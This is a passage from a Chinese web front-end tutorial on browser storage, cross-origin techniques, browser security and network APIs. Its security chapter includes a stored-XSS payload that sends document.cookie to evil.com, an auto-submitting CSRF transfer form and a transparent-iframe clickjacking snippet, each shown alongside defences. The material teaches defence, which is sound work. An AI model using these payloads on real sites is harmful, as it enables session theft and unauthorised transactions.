```

### 8.2.4 第三方 Cookie

```text
第三方 Cookie（Third-Party Cookie）：
  - 由非当前域设置
  - 用于跨站跟踪、广告
  - Chrome 计划 2024-2025 全面禁用
  - 替代方案：
    - Topics API
    - FLEDGE（Remarketing）
    - First-Party Sets
```

## 8.3 Web Storage

### 8.3.1 LocalStorage

```javascript
// 特点：
// - 永久存储，除非手动删除
// - 同源共享
// - 同步 API

// 存储
localStorage.setItem('user', JSON.stringify({ id: 1, name: 'alice' }));

// 读取
const user = JSON.parse(localStorage.getItem('user'));

// 删除
localStorage.removeItem('user');
localStorage.clear(); // 清空

// 监听其他 Tab 变化
window.addEventListener('storage', (e) => {
  console.log('Key:', e.key);
  console.log('Old:', e.oldValue);
  console.log('New:', e.newValue);
  console.log('URL:', e.url);
});
```

### 8.3.2 SessionStorage

```javascript
// 特点：
// - 仅当前 Tab 有效（新建 Tab 也会创建新的）
// - 关闭 Tab 即销毁
// - 同源同 Tab 共享

sessionStorage.setItem('draft', 'unsaved content');
const draft = sessionStorage.getItem('draft');
```

### 8.3.3 Storage Event

```javascript
// 监听其他 Tab 中 LocalStorage 变化
window.addEventListener('storage', (e) => {
  // e.storageArea：localStorage 或 sessionStorage
  // e.key / e.oldValue / e.newValue / e.url
  // 注意：当前页面的修改不会触发 storage 事件
  // 也不在 SessionStorage 跨 Tab 时触发
});
```

### 8.3.4 容量与异常

```javascript
// 检测是否超出配额
try {
  localStorage.setItem('big', 'x'.repeat(10 * 1024 * 1024));
} catch (e) {
  // QuotaExceededError
  console.error('存储已满');
}

// 优雅封装
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      // 清理或降级到 IndexedDB
    }
  }
}
```

## 8.4 IndexedDB

### 8.4.1 IndexedDB 特点

```text
- 异步 API（基于事务）
- 支持大数据（GB 级别）
- 索引（Index）查询
- 同源限制
- 支持二进制（Blob、ArrayBuffer）
- 持久化
```

### 8.4.2 基础使用

```javascript
// 1. 打开数据库
function openDB(name, version, upgradeCallback) {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(name, version);

    request.onupgradeneeded = (e) => {
      // 数据库创建或升级时触发
      const db = e.target.result;
      upgradeCallback(db);
    };

    request.onsuccess = (e) => resolve(e.target.result);
    request.onerror = (e) => reject(e.target.error);
  });
}

// 2. 创建 Object Store
const db = await openDB('MyApp', 1, (db) => {
  if (!db.objectStoreNames.contains('users')) {
    // Step 1：创建 object store，keyPath 为主键
    const store = db.createObjectStore('users', { keyPath: 'id' });
    // Step 2：创建索引
    store.createIndex('byName', 'name', { unique: false });
    store.createIndex('byEmail', 'email', { unique: true });
  }
});

// 3. 添加数据
function addUser(user) {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readwrite');
    const store = tx.objectStore('users');
    const req = store.add(user);
    req.onsuccess = () => resolve();
    req.onerror = (e) => reject(e.target.error);
  });
}

// 4. 查询数据
function getUser(id) {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly');
    const store = tx.objectStore('users');
    const req = store.get(id);
    req.onsuccess = () => resolve(req.result);
    req.onerror = (e) => reject(e.target.error);
  });
}

// 5. 通过索引查询
function findByName(name) {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly');
    const store = tx.objectStore('users');
    const index = store.index('byName');
    const req = index.get(name);
    req.onsuccess = () => resolve(req.result);
    req.onerror = (e) => reject(e.target.error);
  });
}

// 6. 游标遍历
function getAllUsers() {
  return new Promise((resolve, reject) => {
    const tx = db.transaction('users', 'readonly');
    const store = tx.objectStore('users');
    const req = store.openCursor();
    const results = [];
    req.onsuccess = (e) => {
      const cursor = e.target.result;
      if (cursor) {
        results.push(cursor.value);
        cursor.continue();
      } else {
        resolve(results);
      }
    };
    req.onerror = (e) => reject(e.target.error);
  });
}
```

### 8.4.3 封装库推荐

```text
- idb（轻量 Promise 封装）：https://github.com/jakearchibald/idb
- Dexie.js：更友好的 API
- localForage：自动降级（IndexedDB → WebSQL → LocalStorage）
```

## 8.5 Cache Storage

```javascript
// Cache Storage 主要用于 Service Worker
// 1. 在 Service Worker 中使用
self.addEventListener('install', (e) => {
  e.waitUntil(
    caches.open('v1').then((cache) => {
      return cache.addAll(['/', '/styles.css', '/app.js']);
    })
  );
});

// 2. 拦截 fetch
self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then((res) => res || fetch(e.request))
  );
});
```

### 8.5.1 浏览器存储方案选型决策树

> **说明**：下图展示了在实际开发中如何根据数据特性选择合适的浏览器存储方案。从数据类型出发，通过关键决策点（结构化程度、跨标签需求、会话生命周期、是否随请求发送）快速定位到最优方案，并附典型应用场景。

```mermaid
flowchart TD
    A["需要存储数据"] --> B{"数据类型?"}
    B -- "结构化大数据" --> C["IndexedDB"]
    B -- "简单键值对" --> D{"需要跨标签页?"}
    D -- 是 --> E["LocalStorage"]
    D -- 否 --> F{"随会话结束清除?"}
    F -- 是 --> G["SessionStorage"]
    F -- 否 --> E
    B -- "需随请求发送" --> H["Cookie"]
    
    C --> I["场景: 离线应用/大量数据/复杂查询"]
    E --> J["场景: 用户偏好设置/主题/Token"]
    G --> K["场景: 表单草稿/临时状态"]
    H --> L["场景: 登录态/追踪/CSRF Token"]
```

## 8.6 存储选型决策树

```mermaid
graph TB
  Start[需要存储什么?] --> Q1{数据量大小}
  Q1 -->|< 4KB, 需随请求| Cookie[Cookie]
  Q1 -->|较小, 简单 KV| Q2{会话级?}
  Q2 -->|是| SessionStorage[SessionStorage]
  Q2 -->|否| LocalStorage[LocalStorage]
  Q1 -->|大量结构化| IndexedDB[IndexedDB]
  Start -->|缓存 HTTP 响应| CacheStorage[Cache Storage]
  Start -->|二进制 Blob| IndexedDB

  Cookie -->|需 HttpOnly 防止 XSS| Secure[Secure + HttpOnly]
  IndexedDB -->|二进制支持| Yes1[Blob/File/ArrayBuffer]
  IndexedDB -->|索引查询| Yes2[Index API]
```

## 8.7 持久化存储

```javascript
// 现代浏览器提供存储持久化 API
if (navigator.storage && navigator.storage.persist) {
  // Step 1：检查是否已持久化
  const persisted = await navigator.storage.persisted();
  console.log('持久化：', persisted);

  // Step 2：请求持久化（需要用户手势触发）
  if (!persisted) {
    const granted = await navigator.storage.persist();
    console.log('请求结果：', granted);
  }
}

// 配额查询
const estimate = await navigator.storage.estimate();
console.log('配额：', estimate.quota);
console.log('已用：', estimate.usage);
```

## 本章要点速查

| 方案 | 容量 | 场景 |
| --- | --- | --- |
| Cookie | ~4KB | 身份令牌（需随请求） |
| LocalStorage | ~5-10MB | 配置、偏好 |
| SessionStorage | ~5-10MB | 临时数据 |
| IndexedDB | GB 级 | 大数据、离线应用 |
| Cache Storage | GB 级 | 离线缓存、SW 资源 |

---

# 第 9 章 跨页面通信

## 本章学习目标

- 理解同源策略（Same-Origin Policy）的意义
- 掌握 CORS、JSONP、postMessage 等跨域方案
- 熟悉 WebSocket、Nginx 反向代理
- 理解现代浏览器对 Cookie 跨域的限制

## 9.1 同源策略（Same-Origin Policy）

### 9.1.1 同源判定

```text
两个 URL 同源需满足：
  - 协议（protocol）相同
  - 主机（host）相同
  - 端口（port）相同

例：
  https://example.com:443/page
  协议：https ✓
  主机：example.com
  端口：443

  http://example.com:443     → 跨域（协议不同）
  https://api.example.com    → 跨域（主机不同）
  https://example.com:8080   → 跨域（端口不同）
```

### 9.1.2 同源策略限制

```text
默认限制：
  - AJAX 跨域请求
  - DOM 跨域访问（iframe.contentWindow）
  - Cookie、LocalStorage、IndexedDB 跨域访问

未限制：
  - 表单提交（GET/POST）默认允许跨域
  - <script>、<img>、<link>、<iframe> 加载跨域资源
  - postMessage 显式跨域通信
  - CORS 配置允许的 AJAX
```

## 9.2 CORS（Cross-Origin Resource Sharing）

### 9.2.1 简单请求

```text
条件：
  - 方法：GET / HEAD / POST
  - Content-Type: application/x-www-form-urlencoded / multipart/form-data / text/plain
  - 无自定义头

服务端响应头：
  Access-Control-Allow-Origin: https://example.com
  Access-Control-Allow-Credentials: true
  Access-Control-Expose-Headers: X-Custom-Header
```

### 9.2.2 预检请求（Preflight）

```text
非简单请求时，浏览器先发 OPTIONS 预检：
  OPTIONS /api/data HTTP/1.1
  Origin: https://example.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: Content-Type, Authorization

服务端响应：
  Access-Control-Allow-Origin: https://example.com
  Access-Control-Allow-Methods: POST, GET, OPTIONS
  Access-Control-Allow-Headers: Content-Type, Authorization
  Access-Control-Max-Age: 86400  # 预检缓存 24h
```

### 9.2.3 携带凭证

```javascript
// 客户端：必须设置 withCredentials
fetch('https://api.example.com/data', {
  credentials: 'include',  // 'omit' | 'same-origin' | 'include'
});

// 服务端：
// Access-Control-Allow-Origin 不能为 *（必须是具体域）
// Access-Control-Allow-Credentials: true
```

### 9.2.4 服务端实现（Node.js Express）

```javascript
const express = require('express');
const cors = require('cors');

const app = express();

// 简单方式
app.use(cors({
  origin: ['https://example.com', 'https://www.example.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,
}));

// 手动配置
app.use((req, res, next) => {
  const allowOrigin = ['https://example.com'];
  if (allowOrigin.includes(req.headers.origin)) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  }
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});
```

## 9.3 JSONP

### 9.3.1 原理

利用 `<script>` 标签可跨域加载 JS 的特性。

```javascript
// 客户端
function jsonp(url, callbackName) {
  return new Promise((resolve, reject) => {
    // Step 1：定义全局回调
    window[callbackName] = (data) => resolve(data);
    // Step 2：创建 script 标签
    const script = document.createElement('script');
    script.src = `${url}?callback=${callbackName}`;
    script.onerror = reject;
    // Step 3：插入到页面
    document.body.appendChild(script);
    // Step 4：清理
    script.onload = () => script.remove();
  });
}

jsonp('https://api.example.com/data', 'handleData')
  .then((data) => console.log(data));
```

```javascript
// 服务端（Node.js）
app.get('/data', (req, res) => {
  const data = { id: 1, name: 'alice' };
  const callback = req.query.callback;
  // 返回 JS 调用
  res.send(`${callback}(${JSON.stringify(data)})`);
});
```

### 9.3.2 缺点

```text
- 仅支持 GET 请求
- 错误处理困难
- 安全性差（XSS 风险）
- 现代项目已被 CORS 取代
```

## 9.4 postMessage

### 9.4.1 父子页面通信

```javascript
// 父页面发送
const iframe = document.getElementById('child');
iframe.contentWindow.postMessage(
  { type: 'hello', data: 'world' },
  'https://child.example.com'  // 目标 origin
);

// 子页面接收
window.addEventListener('message', (e) => {
  // Step 1：校验 origin
  if (e.origin !== 'https://parent.example.com') return;
  // Step 2：处理消息
  console.log(e.data);
  // Step 3：可回复
  e.source.postMessage({ type: 'reply' }, e.origin);
});
```

### 9.4.2 跨窗口打开

```javascript
// 窗口 A
const popup = window.open('https://other.com');

// 向弹窗发送
popup.postMessage('hi', 'https://other.com');

// 弹窗接收
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://main.com') return;
  console.log(e.data);
});
```

## 9.5 WebSocket 跨域

```javascript
// WebSocket 不受同源策略限制
const ws = new WebSocket('wss://api.example.com/socket');

ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'subscribe', topic: 'news' }));
};
ws.onmessage = (e) => {
  console.log('Received:', e.data);
};
```

## 9.6 Cookie 跨域

### 9.6.1 默认行为

```text
默认：Cookie 仅在同站（SameSite=Lax）发送
跨域 AJAX 默认不携带 Cookie
```

### 9.6.2 实现跨域 Cookie

```javascript
// 客户端
fetch('https://api.example.com/data', {
  credentials: 'include',  // 关键：携带 Cookie
});

// 服务端
res.setHeader('Access-Control-Allow-Origin', 'https://main.com');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Cookie 设置
res.cookie('token', 'xxx', {
  domain: '.example.com',  // 跨子域共享
  sameSite: 'none',        // 允许跨站
  secure: true,            // 必须 HTTPS
  httpOnly: true,
});
```

## 9.7 Nginx 反向代理

```nginx
# nginx.conf
server {
  listen 80;
  server_name www.example.com;

  # 前端静态资源
  location / {
    root /var/www/html;
    try_files $uri $uri/ /index.html;
  }

  # API 代理（解决开发环境跨域）
  location /api/ {
    proxy_pass https://api.backend.com/;  # 注意尾斜杠
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;

    # WebSocket 代理
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
  }
}
```

## 9.8 跨域方案对比

| 方案 | 适用场景 | 优缺点 |
| --- | --- | --- |
| CORS | 现代标准 | 灵活、安全、推荐 |
| JSONP | 兼容老旧浏览器 | 仅 GET、不安全 |
| postMessage | iframe/弹窗 | 双向通信、需校验 |
| WebSocket | 实时通信 | 双向、不受同源限制 |
| Nginx 反代 | 生产环境 | 解决复杂跨域 |
| 代理服务器 | 开发环境 | 简单、webpack-dev-server |

## 本章要点速查

| 概念 | 关键点 |
| --- | --- |
| 同源 | 协议 + 主机 + 端口 |
| CORS | 简单请求 / 预检请求 |
| 凭证 | credentials: 'include' + 显式 origin |
| postMessage | 跨窗口/iframe 通信 |
| SameSite | Strict / Lax / None |
| 反向代理 | Nginx / Apache / Node |

---

# 第 10 章 浏览器安全

## 本章学习目标

- 掌握 XSS、CSRF、Clickjacking 等常见攻击原理与防御
- 理解 CSP（Content Security Policy）配置
- 熟悉 HTTPS/TLS、SRI、HSTS 等安全机制
- 掌握常用安全响应头

### 浏览器安全防御体系全景图

> **说明**：下图展示了浏览器的多层安全防御体系。从传输层到内容层，每个层级都有对应的防护机制，形成纵深防御。理解这张全景图有助于建立完整的安全认知，后续各小节将逐一深入讲解每项技术。

```mermaid
flowchart TD
    subgraph 传输层["🔒 传输层安全"]
        HTTPS["HTTPS/TLS 加密"]
        CT["Certificate Transparency<br/>证书透明度"]
        HSTS["HSTS 强制HTTPS"]
    end
    
    subgraph 内容层["🛡️ 内容层安全"]
        CSP["Content Security Policy<br/>内容安全策略"]
        SRI["Subresource Integrity<br/>子资源完整性"]
        COOP["Cross-Origin Opener Policy<br/>跨源打开者策略"]
        COEP["Cross-Origin Embedder Policy<br/>跨源嵌入者策略"]
    end
    
    subgraph 攻击防护["⚔️ 攻击防护层"]
        XSS_Defense["XSS 防御<br/>输入过滤 / 输出转义<br/>HttpOnly Cookie / Sanitizer API"]
        CSRF_Defense["CSRF 防御<br/>SameSite Cookie / CSRF Token<br/>Referer 验证"]
        Mixed_Content["混合内容防护<br/>自动升级 HTTP→HTTPS<br/>阻止不安全资源加载"]
    end
    
    HTTPS --> CSP
    HTTPS --> SRI
    HSTS --> Mixed_Content
    CSP --> XSS_Defense
    CSP --> CSRF_Defense
    SRI --> 内容层
    COOP --> 攻击防护
    COEP --> 攻击防护
    
    style 传输层 fill:#e1f5fe,#01579b
    style 内容层 fill:#fff3e0,#e65100
    style 攻击防护 fill:#f3e5f5,#4a148c
```

## 10.1 XSS（Cross-Site Scripting）

### 10.1.1 XSS 类型

```text
1. 反射型 XSS（Reflected）
   - 攻击代码在 URL 中，服务器直接反射到页面
   - 需诱导用户点击

2. 存储型 XSS（Stored）
   - 攻击代码存储在数据库
   - 影响所有访问该页面的用户
   - 危害最大

3. DOM 型 XSS（DOM-Based）
   - 完全在客户端发生
   - 通过修改 DOM 树注入
```

### 10.1.2 攻击示例

```html
<!-- 反射型 -->
<!-- URL: https://example.com/search?q=<script>alert(1)</script> -->
<div>您搜索了：<%= request.query.q %></div>  <!-- 危险！未转义 -->

<!-- 存储型 -->
<!-- 用户评论：<script>fetch('//evil.com/steal?c='+document.cookie)</script> -->

<!-- DOM 型 -->
<script>
  const hash = location.hash.slice(1);
  document.body.innerHTML = hash;  // 危险！未转义
</script>
```

### 10.1.3 防御方案

```javascript
// 1. 输出转义
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// 2. 使用 textContent 替代 innerHTML
element.textContent = userInput;  // 安全
element.innerHTML = userInput;    // 危险

// 3. 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(dirtyHTML);

// 4. Vue/React 等框架默认转义
// {{ userInput }}  // 自动转义
// v-html / dangerouslySetInnerHTML  // 危险，需谨慎
```

### 10.1.4 HttpOnly Cookie

```javascript
// 服务端设置
res.cookie('session', token, {
  httpOnly: true,   // JS 无法读取，防 XSS 窃取
  secure: true,     // 仅 HTTPS
  sameSite: 'Strict',
});
```

## 10.2 CSRF（Cross-Site Request Forgery）

### 10.2.1 攻击原理

```html
<!-- 用户已登录 bank.com，Cookie 仍有效 -->
<!-- 攻击者诱导访问 evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

### 10.2.2 防御方案

```javascript
// 1. SameSite Cookie（最有效）
res.cookie('session', token, {
  sameSite: 'Strict',  // 跨站请求不携带
});

// 2. CSRF Token
// 服务端生成 token，存储在 session
// 客户端请求时携带，服务端校验
app.get('/form', (req, res) => {
  const csrfToken = generateToken();
  req.session.csrfToken = csrfToken;
  res.render('form', { csrfToken });
});

app.post('/transfer', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // 处理转账
});

// 3. 双重 Cookie 验证
// 客户端从 Cookie 读 token，加入请求头
function getCookie(name) {
  const m = document.cookie.match(new RegExp('(^|; )' + name + '=([^;]*)'));
  return m ? m[2] : null;
}

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrfToken'),
  },
  body: JSON.stringify(data),
});

// 服务端验证 token 与 Cookie 一致

// 4. Referer / Origin 校验
// 服务端检查请求头 Referer 是否为同源
```

## 10.3 Clickjacking（点击劫持）

### 10.3.1 攻击原理

```html
<!-- 攻击者页面：透明 iframe 覆盖在诱饵按钮上 -->
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<button>领取奖品</button>
```

### 10.3.2 防御

```http
# 1. X-Frame-Options
X-Frame-Options: DENY              # 禁止任何 iframe
X-Frame-Options: SAMEORIGIN        # 仅同源
X-Frame-Options: ALLOW-FROM https://example.com

# 2. CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors https://trusted.com;
```

## 10.4 CSP（Content Security Policy）

### 10.4.1 基础

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *; connect-src 'self' wss://api.example.com
```

### 10.4.2 指令详解

```text
default-src：默认策略
script-src：JS 来源
style-src：CSS 来源
img-src：图片来源
font-src：字体来源
connect-src：XHR/WebSocket
media-src：音频/视频
object-src：<object>/<embed>
frame-src：iframe
frame-ancestors：可被哪些页面嵌入
form-action：表单提交目标
base-uri：<base> 标签
report-uri / report-to：违规上报
```

### 10.4.3 关键字

```text
'none'：禁止
'self'：同源
'unsafe-inline'：允许内联（不推荐）
'unsafe-eval'：允许 eval（不推荐）
'nonce-{base64}'：一次性随机数
'sha256-{hash}'：哈希白名单
'strict-dynamic'：信任由可信脚本加载的脚本
```

### 10.4.4 报告模式

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

## 10.5 SRI（Subresource Integrity）

### 10.5.1 子资源完整性

```html
<!-- 防止 CDN 资源被篡改 -->
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-hK5jL5p..."
  crossorigin="anonymous"
></script>
```

```bash
# 生成 SRI 哈希
openssl dgst -sha384 -binary lib.js | openssl base64 -A
```

## 10.6 HSTS（HTTP Strict Transport Security）

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

```text
效果：
  - 强制使用 HTTPS
  - max-age：有效期
  - includeSubDomains：包含子域
  - preload：加入浏览器内置 HSTS 列表
```

## 10.7 其他安全响应头

```http
X-Content-Type-Options: nosniff       # 禁止 MIME 嗅探
X-XSS-Protection: 1; mode=block      # XSS 过滤（兼容老浏览器）
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

## 10.8 HTTPS / TLS

### 10.8.1 HTTPS 优势

```text
1. 加密：防窃听
2. 完整性：防篡改
3. 认证：防冒充
```

### 10.8.2 TLS 1.3 优势

```text
- 1-RTT 握手
- 0-RTT 数据
- 强制前向保密
- 移除不安全算法
```

### 10.8.3 证书类型

```text
DV（Domain Validation）：域名验证，最基础
OV（Organization Validation）：组织验证
EV（Extended Validation）：扩展验证（已无 UI 区分）
```

## 10.9 混合内容（Mixed Content）

```text
HTTPS 页面中加载 HTTP 资源：
  - Active Mixed Content：JS、CSS、iframe（被现代浏览器默认阻止）
  - Passive Mixed Content：img、video、audio（仅警告）

升级策略：
  - CSP: upgrade-insecure-requests
```

## 10.10 Spectre / 侧信道攻击

```text
Spectre 利用 CPU 推测执行（Speculative Execution）漏洞
  - 攻击者可通过共享内存读取受害进程数据
  - 防御：Site Isolation、跨源读取保护
```

## 本章要点速查

| 攻击 | 防御关键 |
| --- | --- |
| XSS | 输出转义、CSP、HttpOnly |
| CSRF | SameSite、CSRF Token |
| Clickjacking | X-Frame-Options、CSP frame-ancestors |
| 中间人攻击 | HTTPS、HSTS |
| 资源篡改 | SRI |

---

# 第 11 章 网络相关 API

## 本章学习目标

- 掌握 Fetch API 完整使用
- 熟悉 XMLHttpRequest 与 Fetch 的差异
- 掌握 WebSocket、SSE 等实时通信 API
- 了解 Background Sync、Streams 等现代 API

## 11.1 Fetch API

### 11.1.1 基础使用

```javascript
// GET 请求
const response = await fetch('https://api.example.com/users');
const data = await response.json();

// POST 请求
const response = await fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ name: 'alice', age: 30 }),
});
```

### 11.1.2 Fetch 选项

```javascript
fetch(url, {
  method: 'POST',                          // 请求方法
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data),              // 请求体
  mode: 'cors',                            // cors | no-cors | same-origin
  credentials: 'include',                  // omit | same-origin | include
  cache: 'default',                        // default | no-store | reload | no-cache | force-cache
  redirect: 'follow',                      // follow | error | manual
  referrer: 'client',                      // client | no-referrer | URL
  referrerPolicy: 'no-referrer-when-downgrade',
  integrity: 'sha384-...',                 // SRI
  signal: controller.signal,               // AbortController
  keepalive: true,                         // 页面卸载后保持请求
});
```

### 11.1.3 Response 对象

```javascript
const response = await fetch(url);

// 状态
response.status;          // 200
response.statusText;      // 'OK'
response.ok;              // true（200-299）
response.headers;         // Headers 对象
response.redirected;      // 是否被重定向
response.type;            // 'basic' | 'cors' | 'opaque' | 'opaqueredirect' | 'error'
response.url;             // 最终 URL

// 读取响应
response.text();          // 文本
response.json();          // JSON
response.blob();          // Blob
response.arrayBuffer();   // ArrayBuffer
response.formData();      // FormData
response.body;            // ReadableStream

// 流式读取
const reader = response.body.getReader();
const decoder = new TextDecoder();
while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  console.log(decoder.decode(value));
}
```

### 11.1.4 取消请求

```javascript
const controller = new AbortController();

// 设置超时
const timeoutId = setTimeout(() => controller.abort(), 5000);

try {
  const response = await fetch(url, { signal: controller.signal });
  clearTimeout(timeoutId);
  // ...
} catch (e) {
  if (e.name === 'AbortError') {
    console.log('请求被取消');
  }
}
```

### 11.1.5 封装请求函数

```javascript
class HttpClient {
  constructor(baseURL, defaultOptions = {}) {
    this.baseURL = baseURL;
    this.defaultOptions = defaultOptions;
  }

  async request(url, options = {}) {
    // Step 1：合并配置
    const finalOptions = {
      ...this.defaultOptions,
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...this.defaultOptions.headers,
        ...options.headers,
      },
    };

    // Step 2：添加 token
    const token = localStorage.getItem('token');
    if (token) {
      finalOptions.headers.Authorization = `Bearer ${token}`;
    }

    // Step 3：发起请求
    const fullURL = url.startsWith('http') ? url : this.baseURL + url;
    const response = await fetch(fullURL, finalOptions);

    // Step 4：处理响应
    if (!response.ok) {
      // 401 重新登录
      if (response.status === 401) {
        window.location.href = '/login';
      }
      throw new Error(`HTTP ${response.status}`);
    }

    // Step 5：解析数据
    const contentType = response.headers.get('content-type');
    if (contentType?.includes('application/json')) {
      return response.json();
    }
    return response.text();
  }

  get(url, options) {
    return this.request(url, { ...options, method: 'GET' });
  }
  post(url, data, options) {
    return this.request(url, {
      ...options,
      method: 'POST',
      body: JSON.stringify(data),
    });
  }
}
```

## 11.2 XMLHttpRequest

```javascript
// XHR 仍广泛使用，但已被 Fetch 取代
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/data', true);
xhr.setRequestHeader('Authorization', 'Bearer token');
xhr.timeout = 5000;
xhr.withCredentials = true;

xhr.onload = function () {
  if (xhr.status === 200) {
    console.log(xhr.responseText);
  }
};
xhr.onerror = function () {
  console.error('Request failed');
};
xhr.ontimeout = function () {
  console.error('Request timeout');
};
xhr.upload.onprogress = function (e) {
  if (e.lengthComputable) {
    const percent = (e.loaded / e.total) * 100;
    console.log(percent + '%');
  }
};
xhr.send();
```

### 11.2.1 XHR vs Fetch

| 特性 | XHR | Fetch |
| --- | --- | --- |
| API 风格 | 事件回调 | Promise |
| 取消 | xhr.abort() | AbortController |
| 进度 | upload.onprogress | 需 ReadableStream |
| 请求体 | FormData / Blob / String | 同 |
| 流式响应 | 不支持 | 支持 |
| 浏览器支持 | IE 7+ | 现代浏览器 |

## 11.3 WebSocket

### 11.3.1 基础使用

```javascript
const ws = new WebSocket('wss://api.example.com/socket');

// 连接打开
ws.addEventListener('open', (e) => {
  console.log('Connected');
  ws.send(JSON.stringify({ type: 'subscribe', topic: 'news' }));
});

// 收到消息
ws.addEventListener('message', (e) => {
  const data = JSON.parse(e.data);
  console.log('Received:', data);
});

// 关闭
ws.addEventListener('close', (e) => {
  console.log('Disconnected:', e.code, e.reason);
});

// 错误
ws.addEventListener('error', (e) => {
  console.error('Error');
});

// 主动关闭
ws.close(1000, 'Normal closure');
```

### 11.3.2 心跳保活

```javascript
class WSClient {
  constructor(url) {
    this.url = url;
    this.ws = null;
    this.heartbeatTimer = null;
    this.reconnectTimer = null;
    this.reconnectDelay = 1000;
  }

  connect() {
    this.ws = new WebSocket(this.url);

    this.ws.addEventListener('open', () => {
      console.log('Connected');
      this.reconnectDelay = 1000; // 重置重连延迟
      this.startHeartbeat();
    });

    this.ws.addEventListener('message', (e) => {
      const data = JSON.parse(e.data);
      // 收到心跳响应
      if (data.type === 'pong') return;
      // 业务消息
      this.onMessage(data);
    });

    this.ws.addEventListener('close', () => {
      this.stopHeartbeat();
      this.reconnect();
    });

    this.ws.addEventListener('error', () => {
      // 触发 close
    });
  }

  startHeartbeat() {
    this.heartbeatTimer = setInterval(() => {
      if (this.ws.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify({ type: 'ping' }));
      }
    }, 30000);
  }

  stopHeartbeat() {
    clearInterval(this.heartbeatTimer);
  }

  reconnect() {
    clearTimeout(this.reconnectTimer);
    this.reconnectTimer = setTimeout(() => {
      this.reconnectDelay = Math.min(this.reconnectDelay * 2, 30000);
      this.connect();
    }, this.reconnectDelay);
  }

  send(data) {
    if (this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(data));
    }
  }

  onMessage(data) {
    console.log('Message:', data);
  }
}
```

## 11.4 SSE（Server-Sent Events）

```javascript
// 客户端
const source = new EventSource('/api/stream');

source.addEventListener('open', () => {
  console.log('Connected');
});

source.addEventListener('message', (e) => {
  console.log('Message:', e.data);
});

source.addEventListener('error', (e) => {
  if (e.eventPhase === EventSource.CLOSED) {
    console.log('Disconnected');
  }
});

// 关闭
source.close();
```

```javascript
// 服务端（Node.js）
app.get('/api/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  const interval = setInterval(() => {
    res.write(`data: ${JSON.stringify({ time: Date.now() })}\n\n`);
  }, 1000);

  req.on('close', () => clearInterval(interval));
});
```

## 11.5 Beacon API

```javascript
// 用于发送不影响页面卸载的分析数据
// 即使页面已关闭也能发送
navigator.sendBeacon('/api/analytics', JSON.stringify({
  event: 'pageview',
  url: location.href,
}));

// 优势：
// - 异步、非阻塞
// - 不受页面卸载影响
// - 浏览器保证发送
```

## 11.6 Background Sync

```javascript
// Service Worker 中使用
// 用于离线场景下稍后同步
self.registration.sync.register('sync-messages');
// 用户重新联网后触发
self.addEventListener('sync', (e) => {
  if (e.tag === 'sync-messages') {
    e.waitUntil(sendPendingMessages());
  }
});
```

## 11.7 Streams API

```javascript
// 读取流（ReadableStream）
const response = await fetch(url);
const reader = response.body.pipeThrough(new TextDecoderStream()).getReader();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  console.log(value);
}
```

```javascript
// 写入流（WritableStream）
const writable = new WritableStream({
  write(chunk) {
    console.log('Received:', chunk);
  },
});

const writer = writable.getWriter();
await writer.write('hello');
await writer.write('world');
await writer.close();
```

## 本章要点速查

